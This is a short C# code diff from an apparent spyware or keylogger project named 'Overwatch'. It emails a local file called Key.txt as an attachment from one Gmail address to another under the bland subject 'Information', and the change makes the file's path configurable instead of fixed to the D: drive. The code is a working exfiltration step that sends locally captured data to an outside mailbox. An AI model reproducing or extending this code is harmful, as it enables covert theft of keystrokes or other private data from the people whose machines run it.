@@ -13,7 +13,7 @@ namespace Overwatch
                 MailAddress from = new MailAddress("isthechastener@gmail.com");
                 MailAddress to = new MailAddress("satiriorn@gmail.com");
                 MailMessage message = new MailMessage(from, to);
-                message.Attachments.Add(new Attachment("D:\\Key.txt"));
+                message.Attachments.Add(new Attachment(appConfing.targetDirPath + "\\Key.txt"));
                 message.Subject = "Information";
                 message.Body = "<h2>Information</h2>";
                 message.IsBodyHtml = true;
